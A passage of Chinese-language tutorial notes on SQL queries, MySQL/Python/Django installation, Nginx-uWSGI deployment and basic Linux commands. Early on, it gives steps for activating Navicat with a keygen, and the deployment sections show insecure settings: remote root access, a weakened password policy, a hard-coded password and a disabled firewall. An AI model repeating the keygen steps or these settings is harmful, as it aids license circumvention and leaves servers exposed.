1select name,age form t_user; 5、可视化工具navicat 12345671. 先安装好navicate,不要打开2. 将注册机拷贝到安装目录下3. 以管理员身份运行注册机4. 激活： (1) 点击右侧path (2) 点击第4个中的generate 生成序列号，打开navicat把序列号复制过去,生成一个请求码，把请求码复制回到注册机 (3) 点击第4个最下面的generate即可 四、SQL查询语句结构化查询语言SQL（Structured Query Language）：用于存取数据、更新、查询和管理关系数据库系统的程序设计语言。 1、查询表中的列 查询所有列 1select * from 表名; # select * from t_user; 查询指定列–部分列 1select 列名1，列名2 ... from 表名; 2、列操作 列运算：列查询支持算术运算【+ - * &#x2F;】 运算中出现null 结果也为null 1select id+1，age * 2 from t_user； 列拼接 1select concat(age,&quot;岁&quot;) from t_user; 列别名 12select name as 姓名 from t_user；-- select 列名 as 别名 from t_user; 注意： as可省略 列去重（了解） 1select distinct age from t_user； 3、where子句3.1 条件查询如需有条件地从表中选取一部分数据行，可将 WHERE 子句添加到 SELECT 语句中。 基本语法： 1select ... from 表名 where 条件表达式 ; 如：查询年龄大于20的用户信息 1select * from t_user where age &gt; 20; 比较运算符：【&#x3D; !&#x3D; &gt; &lt; &gt;&#x3D; &lt;&#x3D; &lt;&gt;】 逻辑运算符：【and or not】 范围 ：【in(xxx,xxx,xxx…) between.. and】 1234567891011# 查询“id大于3” 且 “年龄小于19” 或者 “名字是JJ” 的用户的 id,name,ageselect id,name,age from t_user where id &gt; 3 and age &lt; 19 or name = &#x27;JJ&#x27;# 查询生日在‘2018-3-08 00:00:00’之后的用户select id,name from t_user where birthday &gt; &#x27;2018-3-08 00:00:00&#x27;;# 查询年龄大于18 并且id在(1,3,5,7)其中之一的用户select id,name,age from t_user where age &gt; 18 and id in(1,3,5,7);# 查询年龄大于18 并且id在2-4之前的用户select id,name,age from t_user where id between 2 and 4; 3.2 空值判断语法： ​ select … from 表名 where 列名 IS NULL and 列名 IS NOT NULL 1select id,name,age from t_user where name is null and age is not null; 注意：不能用如下语句进行空值判断 12select * from t_user where birthday = null; -- errorselect * from t_user where birthday = &#x27;null&#x27;; -- error 3.3 模糊查询 % 任意多个字符 _ 一个字符 语法： 1select ... from 表名 where 列名 like &#x27;%..%&#x27; 示例： 123查询名字中包含o的数据select * from t_user where name like &quot;%o%&quot; like “%abc%” 含有abc like “%abc” 以abc结尾 like “abc%” 以abc开头 like “ab%_” 以ab开头，且ab后至少有一个字符 like “%__%” 至少有2个字符 或 length(列名) &gt;&#x3D;2 4、分页查询1234567891011从第一条开始查询，共查询3条数据 == limit 0,3 select ... from 表名 limit 3; 从第一条开始，共查询2条select ... from 表名 limit 0,2;从第三条开始，共查询3条select ... from 表名 limit 2,3;每页显示n条，查询第m页select ... from 表名 limit (m-1)*n,n; 5、ORDER BY子句：排序语法： 1select ... from 表名 ORDER BY 列名 ASC : 升序(默认) DESC : 降序 12345根据id降序排列select * from t_user order by id desc;根据age升序排列，年龄相同按薪水升序排序select * from t_user order by age asc,salary asc; 6、聚合函数：组函数 MAX( ) 最大值 MIN( ) 最小值 SUM( ) 求和 AVG( ) 求平均值 COUNT( ) 总数 12345678查询最大id和年龄的平均值（结果只有一行）select max(id), avg(age) from t_user;查询共有多少个id（总数）select count(id) from t_user;查询年龄总和，和平均年龄select count(age),avg(age) from t_user; 注意： 12select max(age),name from t_user -- 得到的结果是逻辑扭曲的 -- 7、GROUP BY：分组统计语法： 1select ... from 表名 group by 列名 示例： 查询每个部门的最高工资，最低工资，最大年龄，部门id 1select max(salary),min(salary),max(age),detp_id from t_employee group by dept_id; 查询每个部门的平均工资，最低工资，工资总和，部门id 1select avg(salary),min(salary),sum(salary),dept_id from t_employee group by dept_id; 查询每个部门的员工总数 1select count(id),dept_id from t_employee group by dept_id; 聚合统计：将dept_id和age都相同的数据分到一组 1select age,dept_id from t_employee group by dept_id,age; 注意：分组查询中除了组函数外，只能查询分组条件的字段 8、having子句：分组限制语法： 1select ... from 表名 group by 列名 HAVING .. ; 在group形成临时表之后，最终确定结果之前执行，即对每个临时表做筛选，满足having条件的临时表才可以将一条数据放入最终结果。 示例： 查询每个部门的平均工资大于10000的员工的平均年龄和最高工资 1select avg(age),max(salary),dept_id from t_employee group by dept_id having avg(salary) &gt;10000; 查询最小年龄小于20的部门员工总数和部门id 1select count(id),dept_id from t_employee group by dept_id having min(age) &lt; 20; 重点理解：HAVING的作用时刻 注意：和where的区别是： where先执行，用来对总表做数据筛选 having在where之后的group之后执行，对分组过程中的临时表做筛选，每个临时表筛选一次 补充：如果一个需求，where和having都可以实现，建议使用where，效率更高 123451. where是对总表做筛选，having是对分组表做筛选2. where后面接列名作为条件 （where后面不可以使用组函数）而having后面都可以接，但一般接组函数 - 如果是列名作为条件，使用where - 如果是组函数作为条件，使用having 9、case子句语法： 1234567891011select case when bool表达式 then 结果1 when bool表达式 then 结果2 ... else 默认结果end，列名1，列名2...from 表名 ... 示例： 12345678select case when age &lt; 20 then &#x27;青少年&#x27; when age &gt;=20 and age &lt; 40 then &#x27;中年&#x27; ELSE &#x27;老年&#x27;end as &#x27;年龄段&#x27;,age,namefrom t_employee order by age; 10、子查询将一个查询结果作为另一个查询的一部分，称为子查询 查询工资大于平均工资的员工信息 1select * from t_employee where salary &gt; (select avg(salary) from t_employee); 查询工资小于平均值的员工数量 1select count(id) from t_employee where salary &lt; (select avg(salary) from t_employee) 查询平均工资大于10000的部门的员工信息 123select id,name,age,salary from t_employee where dept_id in (select dept_id from t_employee group by dept_id having avg(salary)&gt;10000)-- 平均工资大小10000的部门有哪些 显示的部门id 1 3 5 注意:子查询的执行效率，很低 五、补充 LENGTH() 获取长度 LCASE() 转为小写字符 abcd UCASE() 转为大小字符 ABCD TRIM() 去除头部和尾部的空格 NOW() 当前日期和时间 CURDATE() 当前日期 CURTIME() 当前时间 DATE_FORMAT(NOW(),’%Y&#x2F;%m&#x2F;%d %H:%i:%s’) 日期格式化 DATABASE() 当前的数据库名称 USER() 当前用户名 VERSION() 当前服务器版本","categories":[],"tags":[]},{"title":"","slug":"Linux_03","date":"2024-10-24T11:20:58.383Z","updated":"2024-10-07T05:20:49.253Z","comments":true,"path":"2024/10/24/Linux_03/","permalink":"http://example.com/2024/10/24/Linux_03/","excerpt":"","text":"Nginx服务器一、Nginx概述1、简介1.1 什么nginxNginx是一款轻量级的Web服务器&#x2F;反向代理服务器 ，其特点是占有内存少，并发能力强。 2.2 nginx的作用 静态HTTP服务器（ 处理静态资源 - 动静分离）： 首先，Nginx是一个HTTP服务器，可以将服务器上的静态文件（图片、CSS、JS文件等）通过HTTP协议展现给客户端。 将静态资源的处理交给Nginx服务器 123# 一个项目中的资源可以为两大类： 1. 动态资源的请求 普通URL -- uwsgi 2. 静态资源的请求 /static/ -- nginx Nginx提供的动静分离是指把动态请求和静态请求分离开，合适的服务器处理合适的请求，使整个服务器系统的性能、效率更高。 uWSGI更适合做动态内容的执行，nginx更适合做静态内容的处理，客户端请求直接访问nginx服务器，留下静态部分处理，动态部分转发给uWSGI服务器，最终实现“动静分离”。 反向代理服务器： 反向代理是指以代理服务器nginx来接受internet上的请求，然后将请求转发给内部网络上的其它服务器uWSGI，并将从uWSGI服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。 负载均衡 ： 多在高并发情况下需要使用。其原理就是将数据流量分摊到多个服务器执行，减轻每台服务器的压力，多台服务器(集群)共同完成工作任务，从而提高了数据的吞吐量。 2、安装步骤 将tar包发送的linux 解压 tar -zxvf nginx-1.11.1.tar.gz 安装依赖 yum install gcc zlib-devel pcre-devel cd到解压目录：./configure #配置检测 cd到解压目录：make &amp;&amp; make install #编译并安装 安装完成，安装路径为/usr/local/nginx ,日志路径为 /usr/local/nginx/logs , 可执行文件路径为 /usr/local/nginx/sbin ,配置文件路径为 /usr/local/nginx/conf 欢迎页面路径为 /usr/local/nginx/html ln -s /usr/local/nginx/sbin/nginx /usr/bin/nginx 制作连接，便于执行nginx指令 nginx #启动nginx -s stop #关闭nginx -s reload #重启 http://ip:80即可访问nginx欢迎页面 二、nginx与uWSGInginx配置–到配置路径中的nginx.conf /usr/local/nginx/conf/nginx.conf 1234567891011121314151617181920upstream ems&#123; server 192.168.157.141:9001; # uWSGI&#x27;s socket = #server 192.168.157.142:9001; #192.168.x.x:9001 #可以在添加其他的uWSGI的服务器&#125;server &#123; listen 80; server_name 192.168.157.142; # nginx服务器的ip charset utf-8; location / &#123; uwsgi_pass ems; #和上面的upstream转接 include /usr/local/nginx/conf/uwsgi_params; # the uwsgi_params file you installed &#125; location /static &#123; #http://ip:80/static/a/b/c/d.png ==&gt; /usr/local/static/a/b/c/d.png alias /usr/local/static; # your Django project&#x27;s static files - amend as required &#125; ...｝ 配置好后，重启nginx即可，可以使用Nginx服务器来访问项目 注意关闭防火墙！！ 两台虚拟主机，一个运行nginx，其中保存project的静态资源；一个运行uwsgi，其中保存并部署project。 三、集群和负载均衡策略搭建uWSGI集群，只需要多做几份uWSGI的配置文件，文件中设置不同的ip:port，指向相同的project，然后启动多个uWSGI即可。 12345678910111213141516171819202122*默认:轮询 upstream django &#123; server 192.168.0.103:8989; server 192.168.0.104:8989; &#125;*iphash:基于ip的负载均衡. upstream django &#123; ip_hash; server 192.168.0.103:8989; server 192.168.0.104:8990; &#125;*权重轮询: upstream django &#123; server 192.168.0.103:8989 weight=1; server 192.168.0.104:8990 weight=2; &#125;*最小连接数： upstream django &#123; least_conn; server 192.168.0.103:8989; server 192.168.0.104:8990; &#125; 至此，一个uWSGI集群搭建完成，nginx作为反向代理服务器和web服务器接收请求，然后处理静态的部分，动态部分按照负载均衡策略转发给某一个uWSGI服务器。 123# 集群解决了什么问题： 1. 高并发 2. 高完整性（高可用性） 至此python-web-project成功运行于 一个对高并发有更好支持，具有高可用性（high-available）的系统中 123456789企业级项目部署： 1. 买一台电脑，装上centos7系统，部署项目（上传项目，装Nginx/uwsgi）,但该电脑的ip是局部网ip， 老板也可以访问，但不能给用户用 直接把主网络插到这台电脑上，它就有一个外网ip，外网ip给用户可以吗？不可以 -- 动态ip 真想这么做，需要向三大运营商申请固定ip -- （监控） 2. 租云服务器 BAT华为等 大机房 电脑 花钱买服务 4G 8核 8M 它会给你提供一个ip地址 用户名和密码 此时你就可以运程操作它了 secureCRT FileZilla ip地址 ip+url访问 购买域名 www.baidu.com 绑定ip 工信部备案 -- 公安备案","categories":[],"tags":[]},{"title":"","slug":"Linux_02","date":"2024-10-24T11:20:58.381Z","updated":"2024-10-07T05:20:50.661Z","comments":true,"path":"2024/10/24/Linux_02/","permalink":"http://example.com/2024/10/24/Linux_02/","excerpt":"","text":"项目环境部署一、MySQL5.7安装1、安装方式1.1 方式一 yum安装（推荐使用该方式）在CentOS中默认安装有MariaDB，这个是MySQL的分支 如果必须要安装MySQL，首先必须添加mysql社区repo通过输入命令： rpm -ivh http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm 然后再yum install -y mysql-server # yum安装，需要外网环境 1.2 方式二 rpm安装（不建议） rpm -ivh perl-*.rpm #安装所有perl依赖 rpm -Uvh mysql-libs-5.1.73-7.el6.i686.rpm #更新mysql的类库 rpm -ivh mysql-5.1.73-7.el6.i686.rpm mysql-server-5.1.73-7.el6.i686.rpm #安装mysql主服务 2、启动MySQL服务 systemctl start/stop/restart/status mysqld 查看MySQL运行状态： systemctl status mysqld.service 3、使用MySQL注意：以下方式针对mysql5.7 初次使用，需要找到root的密码： grep &quot;password&quot; /var/log/mysqld.log 找到密码后，连接数据库 mysql -uroot -p密码 输入初始密码，此时不能做任何事情，因为MySQL默认必须修改密码之后才能操作数据库： ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;new password&#39;; 1234567891011遇到错误： ERROR 1819 (HY000): Your password does not satisfy the current policy requirements 解决方案：1、首先需要设置密码的验证强度等级，设置 validate_password_policy 的全局参数为 LOW 即可，输入设值语句 “ set global validate_password_policy=LOW; ” 进行设值2、当前密码长度为 8 ，如果不介意的话就不用修改了，按照通用的来讲，设置为 6 位的密码，设置 validate_password_length 的全局参数为 6 即可，输入设值语句 “ set global validate_password_length=6; ” 进行设值3、再重置密码ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;new password&#x27;;4、查看 mysql 初始的密码策略，输入语句 “ SHOW VARIABLES LIKE &#x27;validate_password%&#x27;; ” 进行查看 选择数据库use mysql 选择表 查询表 4、MySQL远程连接 到mysql库的user表中 update user set host=&#39;%&#39; where user=&#39;root&#39;; #添加可以远程访问的账号 MySQL5.7版本 flush privileges; #刷新权限，保证新添加的账号可用 关闭linux的防火墙，保证3306可以访问 5、MySQL卸载 rpm -e mysql-server需要完整的包名 通过rpm -qa | grep mysql查找包名 #只需卸载主服务即可 rm -rf /var/lib/mysql #删除所有mysql的数据 6、MySQL root密码找回（重置）找到/etc/my.cnf 123[mysqld]...skip-grant-tables //注意，建议在拆除网线的情况下添加 (而且添加配置后，需要重启mysqld服务) 1234[root@Server ~] mysql -urootmysql&gt; use mysql;mysql&gt; update user set password=password(&#x27;123&#x27;) where host=&#x27;localhost&#x27;; //修改密码mysql&gt; flush privileges; 然后将如上配置删除或注释 123# 将开发好的项目部署到Linux系统 Linux 而不是windows （开发）# Day01 - Linux基本指令 -- 字符界面 无法使用鼠标# Day02 - 安装环境MySQL Python 上传项目 部署运行项目 二、Python安装1、安装依赖 yum -y install python-devel openssl-devel bzip2-devel zlib-devel expat-devel ncurses-devel sqlite-devel gdbm-devel xz-devel tk-devel readline-devel gcc yum -y groupinstall “Development tools” 如上两步，汇总安装了python生产环境的各种第三方依赖包 2、安装Python 将python的tar包发送给linux (建议位置：&#x2F;usr&#x2F;local&#x2F;) 解压tar包:tar -zxvf Python-3.5.2.tgz cd到解压目录中配置：./configure --prefix=/usr/local/python3 --enable-optimizations 目的：检测环境中依赖是否完整，设置python的安装位置，同时生成一个编译文件，用于进行python编译：make 在解压目录中：先 make 编译 然后 make install 安装 123456安装后的日志如下....Collecting setuptoolsCollecting pipInstalling collected packages: setuptools, pipSuccessfully installed pip-8.1.1 setuptools-20.10.1 将python3 设置为系统默认python解释器 将&#x2F;usr&#x2F;bin下的python文件改名 mv /usr/bin/python /usr/bin/python2.7.5 将python3的执行文件链接到 &#x2F;usr&#x2F;bin&#x2F;python ln -s /usr/local/python3/bin/python3 /usr/bin/python 12# 执行以上两步操作并不是把python3安装目录添加到环境变量中# 而是将python3安装目录下python3解释器软链接到某一个环境变量的目录下 设置环境变量：&#x2F;etc&#x2F;profile中添加配置 123在文件末尾追加，不要改动文件的其他内容！！！！！！！export python_home=/usr/local/python3export PATH=$PATH:$python_home/bin 注意，设置好后，为了让环境变量生效：source /etc/profile，然后 python3即可进入python3的环境 更新pip pip3 install --upgrade pip 补充： 安装yum install mysql-devel 由于yum用python2编译执行，所以需要单独为yum设置为python2，找到/usr/bin/yum文件，修改文件头：#!/usr/bin/python2.7.5 修改 &#x2F;usr&#x2F;libexec&#x2F;urlgrabber-ext-down 文件的第一行改为 ‘#!/usr/bin/python2.7.5’ 12345678910111213141516171819202122232425# 总结Python安装步骤： 1. 安装依赖 两长串复制过去直接执行 -- 注意需要外网 2. 将python3.6+的tar包发送到linux系统中 建议放在/usr/local下 3. 解压tar包 4. 进入解压目录，执行 ./configure --prefix=/usr/local/python3 --enable-optimizations 5. 执行 make 指令 -- 注意时间较长 6. make install 即可完成安装 -- 安装完后在/usr/local/python3下就是python的安装文件 # 发软链接 1. 将默认的Python2版改名 mv /usr/bin/python /usr/bin/python2.7.5 2. 再将python3下的解释发快捷方式到/usr/bin下 ln -s /usr/local/python3/bin/python3 /usr/bin/python # 配置环境变量 1. vi /etc/profile文件下 在最后面添加下面的内容： export PATH=$PATH:/usr/local/python3/bin/ 2. 让环境变量生效 执行 source /etc/profile即可 # 更新pip 1. 执行 pip3 install --upgrade pip # 修改yum文件头 yum默认是基于python2 1. vi /usr/bin/yum 的第一行的最后面改为python2.7.5 2. vi /usr/libexec/urlgrabber-ext-down 同上即可 三、Django安装 安装数据库驱动：pip install mysqlclient pip install django==&quot;2.0.6&quot; 测试使用： django-admin startproject testproj 在当前目录下创建一个project:”testproj” cd到testproj目录下的testporj目录下settings.py 修改配置：ALLOWED_HOSTS = [&quot;*&quot;] 启动django内置的web服务器。cd到testproj目录下，执行：python manage.py runserver 0.0.0.0:port 在Windows的浏览器中访问：ip:port – ip为Linux系统的ip地址 四、uWSGI服务器1、WSGI协议 使用Django或Flask框架编写的Web应用程序，在python manage.py runserver 时都启动的是框架内置的服务器来运行Web应用程序，而内置的服务器遵循了WSGI协议（WSGI Server）。 WSGI：全称是Web Server Gateway Interface，WSGI不是服务器，python模块，框架，API或者任何软件，只是一种规范，描述web server如何与web application通信的规范。 WSGI server负责从客户端接收请求，将request转发给application，将application返回的response返回给客户端； WSGI application接收由server转发的request，处理请求，并将处理结果返回给server。 要实现WSGI协议，必须同时实现web server和web application，当前运行在WSGI协议之上的web框架有Bottle, Flask, Django。 总结：WSGI是Web 服务器(uWSGI)与 Web 应用程序或应用框架(Django)之间的一种低级别的接口。 2、uWSGI服务器安装WSGI协议下web服务器很多：django内置，uWSGI，gunicorn。 2.1 服务器安装 将uWSGI的tar包发送linux 解压tar：tar -zxvf uwsgi-2.0.17.tar.gz cd到解压目录下，编译：make 为了可以更方便的执行 uwsgi 启动uWSGI服务器，定制链接： ln -s /usr/local/uwsgi-2.0.17/uwsgi /usr/bin/uwsgi 则可以在任意目录下执行 uwsgi 去启动uWSGI服务器 测试使用python的wsgi服务器-uWSGI 在任意的一个目录中定义一个python脚本：hello.py 123def application(env, start_response): start_response(&#x27;200 OK&#x27;, [(&#x27;Content-Type&#x27;,&#x27;text/html;charset=utf-8&#x27;)]) return [bytes(&#x27;你好啊！！&#x27;,&#x27;utf-8&#x27;),b&#x27;Mr_lee&#x27;] # 基于wsgi协议规范实现的代码 启动uWSGI服务器，并部署hello.py程序 uwsgi --http 192.168.248.128:8001 --wsgi-file hello.py #注意hilo.py可以写成绝对路径 浏览器访问：192.168.248.128:8001 3、 uWSGI部署django项目 在数据库中建好项目需要的database：“ems” 使用Navicat创建即可,注意字符集为 utf8 在Django项目的settings.py中修改配置 12345678910111213DEBUG = False #去掉开发模式 ALLOWED_HOSTS = [&quot;*&quot;] #开放访问hostDATABASES = &#123; #合适数据库参数 &#x27;default&#x27;: &#123; &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;, &#x27;NAME&#x27;: &#x27;ems&#x27;, &#x27;USER&#x27;: &#x27;root&#x27;, &#x27;HOST&#x27;: &#x27;localhost&#x27;, &#x27;PORT&#x27;: &#x27;3306&#x27;, &#x27;PASSWORD&#x27;: &#x27;123456&#x27; &#125;&#125; 发送项目到linux并做移植 python manage.py makemigrations python manage.py migrate 编写uWSGI的配置文件 12345678910111213141516171819202122232425#随意找一个目录，创建一个文件：config.ini -- 建议放在项目的根目录下[uwsgi]http = 192.168.134.128:9000 # uWSGI服务器访问地址#uWSGI和nginx通信的portsocket = 192.168.134.128:9001# the base directory (full path)chdir = /usr/local/django_projects/ems #项目所在目录# Django&#x27;s wsgi filewsgi-file = ems/wsgi.py #基于项目目录的相对路径# maximum number of worker processesprocesses = 4#thread numbers startched in each worker processthreads = 2#monitor uwsgi status 通过该端口可以监控 uwsgi 的负载情况stats = 192.168.134.128:9002# clear environment on exitvacuum = truepidfile = /usr/local/django_projects/ems/uwsgi.pid #进程ID存放于此文件，位置可以自定义#daemonize-run ,file-to-record-logdaemonize = /usr/local/django_projects/ems/uwsgi.log #后台启动模式，日志文件记录位置自定义#http://ip:port/static/...请求会进入该目录找资源，此处可以指向某个app下的static目录#或是将所有静态文件汇总到项目的某一个目录下，然后配置在此是更好的选择#汇集所有已安装app的静态资源到一个目录下，请参见后续内容#http://ip:port/static/a/b/c/d.png ==&gt; /usr/local/xxxx/static/a/b/c/d.pngstatic-map =/static=/usr/local/xxx/static # 只在你写的static-map中找静态资源 根据如上配置启动uWSGI服务器 uwsgi --ini config.ini #注意：config.ini是一个相对路径 关闭服务器 uwsgi --stop uwsgi.pid #通过进程id文件 使用uwsgi服务器运行项目后，出现静态资源无法加载的问题 123456# 分析原因： 1.在django内置的服务器中，调试模式，django查找静态资源默认在每个app的static目录 2. 或者可以在setting.py文件中 STATICFILES_DIRS = [os.path.join(BASE_DIR,&#x27;static&#x27;)] 将项目根目录下的static目录作为静态资源的查找路径 # 但是uwsgi服务器有自己的静态资源的处理方式，也就是它不会在上述的两个地方查找静态资源 uwsgi如何处理静态资源 1234567891011121314# 在config.ini配置文件的最后面来告诉uwsgi服务器要在哪里去找静态资源[uwsig]http = xxx:9000socket = xxx:9001.........# 写你的静态资源的绝对路径，如果在项目根目录下，直接写项目根目录/static即可# 如果是每个app自己管理，把所有的app的static目录添加进来，有几个app加几个static-mapstatic-map=/static=/usr/local/xxx/static url可以分为两大类：1. 普通url-动态资源url 会在urls.py文件中匹配访问路径 最终找到视图函数2. 静态资源url-- /static/ 告诉django当url中有/static/时django会在静态资源的目录下去查找资源 如果你的app过多，每个app自己管理静态资源，此时需要添加的static-map太多 123456# 只需要做两步操作就可以把所有app下的静态资源static目录的文件收集到某一个目录下1. 在项目的setting.py文件中添加 STATIC_ROOT=os.path.join(BASE_DIR,&#x27;static&#x27;) 用于告诉django，将来收集到的静态资源往哪里放 2. 执行收集的指令 python manage.py collectstatic STATIC_URL &#x3D; ‘&#x2F;static&#x2F;‘ # 每个静态资源URL的访问前缀 STATICFIELS_DIRS &#x3D; [os.path.join(BASE_DIR,’static’)] # 添加django内置服务器查找静态资源的路径 STATIC_ROOT &#x3D; os.path.join(BASE_DIR,’static’) # 收集静态资源时的路径 static-map&#x3D;&#x2F;static&#x3D;xxxx # 告诉uwsgi服务器到哪里去找静态资源","categories":[],"tags":[]},{"title":"","slug":"Linux_01","date":"2024-10-24T11:20:58.379Z","updated":"2024-10-07T05:20:50.889Z","comments":true,"path":"2024/10/24/Linux_01/","permalink":"http://example.com/2024/10/24/Linux_01/","excerpt":"","text":"Linux系统一、简介1、操作系统操作系统（Operating System，简称OS）是管理和控制计算机硬件与软件资源的计算机程序&#x2F;软件，是直接运行在“裸机”上的最基本的系统软件，任何其它软件都必须在操作系统的支持下才能运行。 操作系统身负诸如管理与配置内存、决定系统资源供需的优先次序、控制输入与输出设备、操作网络与管理文件系统等基本事务。 2、Linux系统Linux是一套免费使用和自由传播的类Unix操作系统，是一个基于POSIX和UNIX的多用户、多任务、支持多线程和多CPU的操作系统。 Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。 Linux包含了Unix的全部功能和特性。Linux具有以下主要特性: 开放性：系统遵循世界标准规范。 多用户：系统资源可以被不同用户各自拥有使用,每个用户可以对自己的资源进行管理，设置权限等。 多任务：同时执行多个程序,而且各个程序的运行互相独立。Linux系统调度每一个进程,平等地访问微处理器。 良好的界面：Linux同时具有字符界面和图形界面。 丰富的网络功能：Linux在通信和网络功能方面优于其它操作系统。 Linux 内置了很丰富的免费网络服务器软件、数据库和网页的开发工具 。 可靠的系统安全：Linux采取了许多安全技术措施，包括对读、写控制、带保护的子系统、审计跟踪、核心授权等，这为网络多用户环境中的用户提供了必要的安全保障。 良好的可移植性：将操作系统从一个平台转移到另一个平台使它仍然能按其自身的方式运行的能力。 开源且免费的操作系统 ,开源 总结：免费、安全、可靠、稳定、多平台。 双系统（Linux和Windows同时存在 开机时选择操作系统） 虚拟机（借助VMware workstation来运行虚拟系统-Linux） 3、Linux的目录结构（了解） bin (binaries)存放二进制可执行文件 sbin (super user binaries)存放二进制可执行文件，只有root才能访问 etc (etcetera)存放系统配置文件 usr (unix shared resources)用于存放共享的系统资源 home 存放用户文件的根目录 root 超级用户目录 dev (devices)用于存放设备文件 lib (library)存放跟文件系统中的程序运行所需要的共享库及内核模块 mnt (mount)系统管理员安装临时文件系统的安装点 boot 存放用于系统引导时使用的各种文件 tmp (temporary)用于存放各种临时文件 var (variable)用于存放运行时需要改变数据的文件 4、Linux的ShellShell是系统的用户界面，提供了用户与内核进行交互操作的一种接口。它接收用户输入的命令并把它送入内核去执行。 Shell是一个命令行解释器。 它解释由用户输入的命令并且把它们送到内核。 同Linux本身一样，Shell也有多种不同的版本。主要有下列版本的Shell： Bourne Shell：是贝尔实验室开发的。 BASH：是GNU的Bourne Again Shell，是GNU操作系统上默认的shell。 Korn Shell：是对Bourne SHell的发展，在大部分内容上与Bourne Shell兼容。 C Shell：是SUN公司Shell的BSD版本。 二、基本命令1、简单的几个命令 ls：显示指定目录下的文件目录清单（list） cd：切换目录，改变当前的工作目录（change directory） cd ~ 或 cd 切换到用户主目录（用户家目录） cd &#x2F; 切换到根目录 cd .. 上一级目录 cd . 当前目录 pwd：显示当前的工作目录 （print working directory） man：查看帮助 补充：在windows和虚拟机之前切换鼠标：Ctrl + Alt 2、文件基本操作命令2.1 ls 命令作用：显示指定目录下的文件清单 不带参数：显示指定目录中的文件清单，如果没有指定任何目录，则默认为当前目录 [root@Server ~]# ls 显示当前目录下的内容 [root@Server &#x2F;]# ls etc 显示etc目录下的内容（可以是相对路径或绝对路径） ls -a 显示所有文件 包含隐藏文件（以.开头的文件） ls -l 显示文件的详细信息 ls -R 递归显示目录下的文件包括子文件 ls -laR 多个参数结合使用 2.2 mkdir &#x2F; rmdir 命令作用：创建目录&#x2F;删除目录 mkdir 创建目录 mkdir homework 创建一个homework目录 mkdir -p homework&#x2F;a&#x2F;b&#x2F;c&#x2F;d 连续创建多级目录 （了解） mkdir d{1..9} 同时创建d1、d2..d9目录 （了解） rmdir 删除目录（只能删除空目录） 补充：创建文件 touch 文件名 — touch 1.txt 2.3 rm命令作用：删除文件或目录 rm 文件名 rm -i 文件名 ：提示是否删除 （与用户交互）默认有提示 人机交互– rm -f 文件名 ：强制删除 （force） rm -r 目录名 ：删除目录（删除目录时，必须加-r参数） rm -rf 目录名 强制删除目录，不会有提示 2.4 cp命令作用：拷贝文件或目录 cp 原文件名 新文件名 cp 1.txt 11.txt cp 1.txt homework&#x2F;1.txt cp -r 原目录名 新目录名 （拷贝目录必须加-r参数） cp -r homework homework2 2.5 mv命令作用：移动文件或目录 mv 原文件名&#x2F;目录名 新文件名&#x2F;目录名 mv 1.txt homework&#x2F;1.txt 移动文件（剪切） mv 1.txt 1.md 重命名 2.6 通配符 * 匹配任意多个字符 rm *.txt 删除所有的后缀为txt的文件 rm a* 删除所有的以a开头的文件 ?匹配一个字符 rm ?.txt 删除文件名只有一个字符的txt文件 3、显示文件内容3.1 cat命令作用：显示文件内容在屏幕中 cat 1.txt 在屏幕上显示1.txt的内容 3.2 more和less命令作用：分屏显示，非常适合显示超过一屏的文本文件。 按空格翻页 more &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf less &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf 按q键退出显示 在less下 输入/关键字 可以搜索 3.2 head&#x2F;tail命令作用：显示文件头&#x2F;尾10行内容 head httpd.conf 显示头10行 tail httpd.conf 显示尾10行 4、搜索文件内容grep作用：根据关键字搜索并显示关键字所在的行 用法：grep [参数] 关键字 文件名 grep l 1.txt 显示出l所在的行 grep “o w” 1.txt 如果要查找中间有空格的 需要加’ ‘或“ ” grep -i L 1.txt 忽略大小写查找 即大写L和小写l都可查找到 grep -v l 1.txt 显示不匹配的行 grep -n l 1.txt 显示匹配的行的行号 grep -c l 1.txt 显示匹配的总行数 四、文件属性1、chmod 改变文件权限 [root@server1 ~]# ls -l 12-rw-r--r-- 1 Mr_lee staff 29 12 14 16:15 1.txtdrwxr-xr-x 4 Mr_lee staff 136 10 11 18:44 Applications 第1列：表示是否是目录或文件 -代表文件 d代表目录第2-4列：表示用户权限 user第5-7列：表示所在的组权限 group第8-10列：表示其他人权限 other r : read 可读w : write 可写x : execution 可执行u : userg : groupo : othera : all 等价于ugo &#x3D;： 表示赋予（设置）指定权限，要注意它会覆盖原权限 +： add permission 添加权限 -： take away permission 移除权限 示例： chmod a+rwx 1.h 给所有人(ugo)添加可读可写可执行权限 chmod go-wx 1.h 给所在的组和其他人移除写和执行权限 数字表示法： chmod 755 1.h 等价于 用户:rwx 所在组:r-x 其他人:r-x即r &#x3D; 2^2 , w &#x3D; 2^1 , x &#x3D; 2^0 ,而 “-“ &#x3D; 0 五、查看进程1、ps命令 不带参数 [user1@server ~]$ ps 功能：查询在当前控制台上运行的进程。 查看所有进程 [user1@server ~]$ ps -aux 功能：查询系统中所有运行的进程，包括后台进程，其中参数a是所有进程，参数x包括不占用控制台的进程，参数u显示用户。 查看所有进程 [user1@server ~]$ ps -ef 功能：查询系统中所有运行的进程，包括后台进程，而且可以显示出每个进程的父进程号。 2、pstree命令 （了解） 树状格式显示进程列表 [user1@server ~]$ pstree 带进程号的树状格式显示进程列表 [user1@server ~]$ pstree -p 3、top命令（了解） [user1@server ~]$ top 功能：动态地显示系统中的进程。 4、kill命令 杀掉指定进程 [user1@server ~]$ kill 3029 强制杀掉指定进程 [user1@server ~]$ kill -9 3029 补充：| 管道 – 连接两个命令的输入和输出，将一个命令的输出作为另一个命令的输入 ​ ps -ef | grep bash 查找包含bash的进程 六、文本编辑器vi命令1、简介vi命令是UNIX操作系统和类UNIX操作系统中最通用的全屏幕纯文本编辑器。 vi编辑器二种模式:编辑模式、命令行模式 vi abc.txt 进入编辑器，此时并不能编辑文本， 需要通过输入【i&#x2F;I、o&#x2F;O、a&#x2F;A、r&#x2F;R】进入编辑模式，可修改文本文件， 在编辑模式中修改完毕后，输入【esc】切换回命令行模式， 在命令行模式中输入【:wq、:q、:x】即退出 2、保存&#x2F;退出以下指定需要在命令行模式下输入： :w 保存文本 :q 不保存文本并退出vi :q! 